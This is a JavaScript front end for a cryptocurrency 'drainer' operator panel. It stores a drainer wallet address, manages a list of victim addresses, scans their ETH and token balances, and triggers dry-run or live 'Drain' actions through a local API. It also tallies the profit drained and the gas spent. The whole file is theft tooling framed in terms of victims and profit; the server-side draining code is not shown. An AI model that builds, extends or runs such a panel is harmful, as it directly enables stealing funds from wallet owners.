const API = location.origin;

async function j(path, opts) {
  const r = await fetch(API + path, opts);
  return r.json();
}

async function loadState() {
  const s = await j("/api/state");
  document.getElementById("drainer").value = s.drainerAddress || "";
  renderVictims(s.victims);
  renderProfit(s.profit);
  renderLogs(s.logs);
  const gas = s.profit.reduce((a, p) => a + (p.gas || 0), 0);
  document.getElementById("statGas").innerHTML = gas.toFixed(6) + "<small>gas spent (ETH)</small>";
  let total = 0;
  for (const p of s.profit) for (const r of p.results) total += r.amount || 0;
  document.getElementById("statProfit").innerHTML = total.toFixed(4) + "<small>total drained (tokens)</small>";
}

async function saveSettings() {
  await j("/api/state", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ drainerAddress: document.getElementById("drainer").value }) });
  loadState();
}

async function addVictim() {
  const a = document.getElementById("victimAddr").value.trim();
  if (!a) return;
  await j("/api/victims", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ address: a }) });
  document.getElementById("victimAddr").value = "";
  loadState();
}

async function removeVictim(addr) {
  await j("/api/victims/" + addr, { method: "DELETE" });
  loadState();
}

async function drain(addr, dry) {
  const btn = event.target;
  btn.disabled = true;
  try {
    const r = await j("/api/drain", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ address: addr, dryRun: dry }) });
    alert((dry ? "DRY RUN: " : "DRAINED: ") + JSON.stringify(r.results, null, 2));
  } catch (e) { alert("error: " + e.message); }
  btn.disabled = false;
  loadState();
}

async function refreshBalances(addr) {
  const row = document.getElementById("row-" + addr);
  const cell = row ? row.querySelector(".bal") : null;
  if (cell) cell.textContent = "loading...";
  const b = await j("/api/balances/" + addr);
  if (cell) {
    let s = b.eth.toFixed(4) + " ETH";
    for (const k of Object.keys(b)) if (k !== "eth" && b[k] > 0) s += " | " + b[k].toFixed(4) + " " + k;
    cell.textContent = s;
  }
}

function renderVictims(victims) {
  const tb = document.getElementById("victimRows");
  tb.innerHTML = "";
  for (const v of victims) {
    const tr = document.createElement("tr");
    tr.id = "row-" + v.address;
    tr.innerHTML = `<td>${v.address.slice(0,10)}...${v.address.slice(-6)}</td><td class="bal">-</td><td class="bal2">-</td><td>
      <button class="ghost" onclick="refreshBalances('${v.address}')">Scan</button>
      <button class="ghost" onclick="drain('${v.address}', true)">Dry</button>
      <button class="green" onclick="drain('${v.address}', false)">Drain</button>
      <button class="ghost" onclick="removeVictim('${v.address}')">x</button></td>`;
    tb.appendChild(tr);
  }
}

function renderProfit(profit) {
  const tb = document.getElementById("profitRows");
  tb.innerHTML = "";
  for (const p of profit.slice(0, 20)) {
    const tr = document.createElement("tr");
    tr.innerHTML = `<td>${p.time}</td><td>${p.victim.slice(0,10)}...</td><td>${p.results.map(r => r.amount + " " + r.token).join(", ")}</td><td>${(p.gas||0).toFixed(6)}</td>`;
    tb.appendChild(tr);
  }
}

function renderLogs(logs) {
  const box = document.getElementById("logBox");
  box.innerHTML = logs.map(l => {
    const cls = l.type === "drain" ? "drain" : l.type === "error" ? "err" : "";
    return `<div class="${cls}"><span class="t">${l.time}</span> ${l.type} ${l.msg || JSON.stringify(l.results || "")}</div>`;
  }).join("");
}

loadState();
setInterval(loadState, 10000);
